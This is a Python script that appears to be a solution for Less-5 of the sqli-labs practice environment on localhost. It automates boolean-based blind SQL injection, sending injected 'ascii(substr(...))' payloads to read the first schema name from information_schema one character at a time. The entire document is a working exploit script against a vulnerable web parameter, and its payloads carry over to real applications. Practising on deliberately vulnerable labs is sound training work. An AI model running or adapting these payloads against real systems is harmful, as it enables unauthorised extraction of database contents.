import requests



url = "http://localhost/sqli-labs-master/Less-5/?id=1'"



def database(url):
    for x in range(1, 1000):
        url_ = "http://localhost/sqli-labs-master/Less-5/?id=1' and (ascii(substr((select schema_name from information_schema.schemata limit 0,1),{0},1)))=0-- aaa".format(x)
        html = requests.get(url_).text
        if "You are in" in html:
            break
        for asc in range(65, 127):
            payload = " and (ascii(substr((select schema_name from information_schema.schemata limit 0,1),{0},1)))={1}-- aaa".format(x, asc)
            new_url = url+payload
            html = requests.get(new_url).text
            if "You are in" in html:
                print(chr(asc))
                break
database(url)
